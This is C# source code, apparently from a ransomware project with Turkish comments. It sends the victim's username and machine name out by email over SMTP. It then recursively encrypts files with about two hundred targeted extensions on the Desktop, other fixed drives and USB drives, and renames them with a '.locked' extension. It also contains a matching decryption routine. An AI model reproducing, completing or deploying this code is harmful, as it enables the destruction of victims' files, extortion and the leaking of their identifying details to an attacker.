﻿using System;
using System.Diagnostics;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading;
using System.Security;
using System.Security.Cryptography;
using System.IO;
using System.Net;
using Microsoft.Win32;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using System.Net.Mail;
using System.Security.AccessControl;
namespace WindowsFormsApplication1
{
    class StartingEncryption
    {
        private string userName;
        private string computerName;
        private string about;
        private cat rsa;
        private string user;
        string exeDir;

        public StartingEncryption()//encrypt icin
        { 
            userName = Environment.UserName;
            
            computerName = System.Environment.MachineName.ToString();
            user = "C:\\Users\\" + userName+"\\Desktop";
            about = "Username: " + userName + "\n" + "ComputerName:" + computerName + "\n";
            sendingMail(about);
            rsa = new cat();
            exeDir = Environment.CurrentDirectory+ AppDomain.CurrentDomain.FriendlyName;
            
        }

        public StartingEncryption(string PassDir)//decrypt icin
        {
            rsa = new cat(PassDir);
            userName = Environment.UserName; 
        }

        private void encryptDirectory(object location)
        {          
            var validExtensions = new[]
            {
                ".odt",".ods",".odp",".odm",".odc",".odb",".doc",".docx",".docm",".wps",".xls",".xlsx",".xlsm",".xlsb",".xlk",".ppt",".pptx",".pptm",".mdb",".accdb",".pst",".dwg",".xf",".dxg",".wpd",".rtf",".wb2",".mdf",".dbf",".psd",".pdd",".pdf",".eps",".ai",".indd",".cdr",".jpg",".jpe",".dng",".3fr",".arw",".srf",".sr2",".bay",".crw",".cr2",".dcr",".kdc",".erf",".mef",".mrwref",".nrw",".orf",".raf",".raw",".rwl",".rw2",".r3d",".ptx",".pef",".srw",".x3f",".der",".cer",".crt",".pem",".pfx",".p12",".p7b",".p7c",".c",".cpp",".txt",".jpeg",".png",".gif",".mp3",".html",".css",".js",".sql",".mp4",".flv",".m3u",".py",".desc",".con",".htm",".bin",".wotreplay",".unity3d",".big",".pak",".rgss3a",".epk",".bik",".slm",".lbf",".sav",".lng",".ttarch2",".mpq",".re4",".apk",".bsa",".cab",".ltx",".forge",".asset",".litemod",".iwi",".das",".upk",".bar",".hkx",".rofl",".DayZProfile",".db0",".mpqge",".vfs0",".mcmeta",".m2",".lrf",".vpp_pc",".ff",".cfr",".snx",".lvl",".arch00",".ntl",".fsh",".w3x",".rim","psk",".tor",".vpk",".iwd",".kf",".mlx",".fpk",".zip",".vtf",".001",".esm",".blob",".dmp",".layout",".menu",".ncf",".sid",".sis",".ztmp",".vdf",".mcgame",".fos",".sb",".im",".wmo",".itm",".map",".wmo",".sb",".svg",".cas",".gho",".iso",".rar",".syncdb",".mdbackup",".hkdb",".hplg",".hvpl",".icxs",".itdb",".itl",".mddata",".sidd",".sidn",".bkf",".qic",".bkp",".bc7",".bc6",".pkpass",".tax",".gdb",".qdf",".t12",".t13",".ibank",".sum",".sie",".sc2save",".d3dbsp",".wmv",".avi",".wma",".m4a",".7z",".torrent",".csv",".cs",".jar",".java",".class"
            };

            try
            {
                string[] files = Directory.GetFiles(location.ToString());

                string[] childDirectories = Directory.GetDirectories(location.ToString());
                for (int i = 0; i < files.Length; i++)
                {
                    string extension = Path.GetExtension(files[i]);
                    if (validExtensions.Contains(extension))
                    {
                        if (files[i]!=exeDir)
                        {
                            rsa.EncryptThreatingRSA(files[i]);
                        }
                    }
                }
                for (int i = 0; i < childDirectories.Length; i++)
                {
                    encryptDirectory(childDirectories[i]);
                }
            }
            catch (Exception)
            {

            }
        }

        private void decryptDirectory(object location)
        {     
            try
            {
                string[] files = Directory.GetFiles(location.ToString());

                string[] childDirectories = Directory.GetDirectories(location.ToString());
                for (int i = 0; i < files.Length; i++)
                {
                    string extension = Path.GetExtension(files[i]);
                    if (extension ==".locked")
                    {
                        rsa.DecryptThreatingRSA(files[i]);
                    }
                }
                for (int i = 0; i < childDirectories.Length; i++)
                {
                    decryptDirectory(childDirectories[i]);
                }
            }
            catch (Exception)
            {

            }
        }

        public void startEncryptAction()
        {
            user = "C:\\Users\\" + Environment.UserName + "\\Desktop"; // masaüstü dizini
            new Thread(new ParameterizedThreadStart(encryptDirectory)).Start(user);//user dizin için threat başlatılıyor
            foreach (var drive in DriveInfo.GetDrives())
            {
                if (drive.DriveType == System.IO.DriveType.Fixed || drive.DriveType == System.IO.DriveType.Removable) //diğer disk ve takılı usb keşfi yapmakta
                {
                    if (drive.Name != "C:\\")
                    {
                        new Thread(new ParameterizedThreadStart(encryptDirectory)).Start(drive.Name);
                    }
                }
            }
        }

        public void startDecryptAction()
        {
            user = "C:\\Users\\" + Environment.UserName + "\\Desktop";
            new Thread(new ParameterizedThreadStart(decryptDirectory)).Start(user);
            foreach (var drive in DriveInfo.GetDrives())
            {
                if (drive.DriveType == System.IO.DriveType.Fixed || drive.DriveType == System.IO.DriveType.Removable)
                {
                    if (drive.Name != "C:\\")
                    {
                        new Thread(new ParameterizedThreadStart(decryptDirectory)).Start(drive.Name);
                    }
                }
            }
        }

        public bool sendingMail(string text,string subject="Encrypted")
        {
            MailMessage mssg = new MailMessage();
            SmtpClient sc = new SmtpClient();

            try
            {   //Hotmail mail adresi kullanbilirsin bu smtp'de
                sc.Credentials = new NetworkCredential("Emailadres", "parola");
                mssg.To.Add("hangi mail adresine gidecek");
                mssg.From = new MailAddress("Kimden", "Baslık", Encoding.UTF8);
                mssg.Subject = subject;
                mssg.BodyEncoding = Encoding.UTF8;
                mssg.IsBodyHtml = true;
                mssg.Body = text.ToString();
                sc.EnableSsl = true;
                sc.Port = 587;
                sc.Host = "smtp.live.com";
                sc.Send(mssg);
                mssg.Dispose();
                return true;
            }
            catch (Exception)
            {
                return false;
            }
            finally
            {
                mssg.Dispose();
            }
        }

    }//class
}//namespace
